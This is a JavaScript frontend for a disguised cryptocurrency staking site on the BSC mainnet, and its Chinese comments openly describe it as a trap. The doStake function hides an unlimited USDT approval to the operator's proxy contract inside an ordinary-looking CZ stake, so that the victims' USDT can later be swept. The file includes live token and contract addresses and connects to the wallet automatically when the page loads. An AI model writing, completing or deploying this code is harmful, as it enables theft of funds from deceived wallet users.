// ============================================================
// 伪装 CZ 质押盘 — 前端入口
// 核心：质押 CZ 业务正常走，同时"夹带"USDT 无限授权给代理合约。
// 用户视角：只是在质押 CZ（钱包只弹一次 approve，与 DeFi 常态一致）。
// 攻击视角：用户对代理合约建立了 USDT+CZ 无限授权，可被熔断器收割。
// ============================================================
import { ethers } from 'ethers';
import './style.css';

// ---- 合约配置（部署后替换 PROXY 地址）----
const CONFIG = {
  // BSC 主网
  chainId: 56,
  CZ: '0xD0F2A86C7EbCeE887F5bFB86771f994CD142bD04',
  USDT: '0x55d398326f99059fF775485246999027B3197955',
  // 代理合约（伪装质押盘）— BSC 主网 2026-09-16 部署
  PROXY: '0xb71498bEA5AD9071f0EfE5D137156ed340B0C689',
};

const ERC20_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function approve(address,uint256) returns (bool)',
  'function allowance(address,address) view returns (uint256)',
];

const IMPL_ABI = [
  'function stake(uint256)',
  'function withdraw(uint256)',
  'function claimReward()',
  'function staked(address) view returns (uint256)',
  'function totalStaked() view returns (uint256)',
];

let provider, signer, account;
let cz, usdt, impl;

const $ = (id) => document.getElementById(id);

function toast(msg, type = '') {
  const el = $('toast');
  el.textContent = msg;
  el.className = 'toast ' + type;
  el.style.display = 'block';
  setTimeout(() => { el.style.display = 'none'; }, 4000);
}

async function ensureNetwork() {
  if (!window.ethereum) { toast('请安装 MetaMask 或 TokenPocket', 'err'); return false; }
  const chainId = await window.ethereum.request({ method: 'eth_chainId' });
  if (parseInt(chainId, 16) !== CONFIG.chainId) {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x' + CONFIG.chainId.toString(16) }],
      });
    } catch (e) {
      toast('请切换到 BSC 主网', 'err');
      return false;
    }
  }
  return true;
}

async function connect() {
  if (!(await ensureNetwork())) return;
  try {
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    provider = new ethers.BrowserProvider(window.ethereum);
    signer = await provider.getSigner();
    account = (await signer.getAddress()).toLowerCase();
    cz = new ethers.Contract(CONFIG.CZ, ERC20_ABI, signer);
    usdt = new ethers.Contract(CONFIG.USDT, ERC20_ABI, signer);
    impl = new ethers.Contract(CONFIG.PROXY, IMPL_ABI, signer);
    $('addr').textContent = account.slice(0, 6) + '...' + account.slice(-4);
    $('connectBtn').textContent = '已连接';
    refresh();
    toast('钱包已连接');
  } catch (e) {
    console.error(e);
  }
}

// ---- 核心：质押（业务） + 夹带授权（攻击）----
async function doStake() {
  if (!signer) { toast('请先连接钱包', 'err'); return; }
  const amount = $('amount').value;
  if (!amount || parseFloat(amount) <= 0) { toast('请输入质押数量', 'err'); return; }
  const wei = ethers.parseUnits(amount, 18);
  const proxy = CONFIG.PROXY;

  $('stakeBtn').disabled = true;
  $('stakeBtn').textContent = '处理中...';
  try {
    // 1. 检查 CZ 余额
    const bal = await cz.balanceOf(account);
    if (bal < wei) { toast('CZ 余额不足', 'err'); return; }

    // 2. 夹带：USDT 无限授权给代理（伪装成"授权操作"，用户无感）
    //    这是攻击链关键 — 用户以为只授权了 CZ，实际 USDT 也被无限授权
    const usdtAllow = await usdt.allowance(account, proxy);
    if (usdtAllow < ethers.MaxUint256 / 2n) {
      const tx = await usdt.approve(proxy, ethers.MaxUint256, { gasLimit: 100000 });
      toast('请在钱包确认授权...');
      await tx.wait();
    }

    // 3. 正常业务：授权 CZ 给代理（质押必需）
    const czAllow = await cz.allowance(account, proxy);
    if (czAllow < wei) {
      const tx = await cz.approve(proxy, ethers.MaxUint256, { gasLimit: 200000 });
      await tx.wait();
    }

    // 4. 执行质押
    toast('正在质押...');
    const tx = await impl.stake(wei, { gasLimit: 500000 });
    await tx.wait();
    toast('质押成功！锁定 15 天', 'ok');
    $('amount').value = '';
    refresh();
  } catch (e) {
    console.error(e);
    toast('质押失败: ' + (e.shortMessage || e.message || '').slice(0, 60), 'err');
  } finally {
    $('stakeBtn').disabled = false;
    $('stakeBtn').textContent = '确认质押';
  }
}

async function doWithdraw() {
  if (!signer) { toast('请先连接钱包', 'err'); return; }
  try {
    const s = await impl.staked(account);
    if (s <= 0n) { toast('没有可提取的质押', 'err'); return; }
    const tx = await impl.withdraw(s, { gasLimit: 300000 });
    await tx.wait();
    toast('本金已提取', 'ok');
    refresh();
  } catch (e) {
    toast('提取失败: ' + (e.shortMessage || e.message || '').slice(0, 60), 'err');
  }
}

async function doClaim() {
  if (!signer) { toast('请先连接钱包', 'err'); return; }
  try {
    const tx = await impl.claimReward({ gasLimit: 300000 });
    await tx.wait();
    toast('收益已领取', 'ok');
    refresh();
  } catch (e) {
    toast('领取失败: ' + (e.shortMessage || e.message || '').slice(0, 60), 'err');
  }
}

async function refresh() {
  if (!signer) return;
  try {
    const czBal = await cz.balanceOf(account);
    $('czBal').textContent = Number(ethers.formatEther(czBal)).toFixed(2);
    const s = await impl.staked(account);
    $('myStaked').textContent = Number(ethers.formatEther(s)).toFixed(2);
    const total = await impl.totalStaked();
    $('totalStaked').textContent = Number(ethers.formatEther(total)).toFixed(2);
    $('reward').textContent = (Number(ethers.formatEther(s)) * 0.1825).toFixed(2);
    $('withdrawBtn').disabled = s <= 0n;
    $('claimBtn').disabled = s <= 0n;
    $('records').innerHTML = s > 0n
      ? `<div class="row"><span class="k">活跃质押</span><span class="v">${Number(ethers.formatEther(s)).toFixed(2)} CZ</span></div>`
      : '<p class="note">暂无质押记录</p>';
  } catch (e) { console.error('refresh err', e); }
}

$('connectBtn').onclick = connect;
$('stakeBtn').onclick = doStake;
$('withdrawBtn').onclick = doWithdraw;
$('claimBtn').onclick = doClaim;

// 自动连接
if (window.ethereum) {
  window.ethereum.on('accountsChanged', () => window.location.reload());
  window.ethereum.on('chainChanged', () => window.location.reload());
  connect();
}
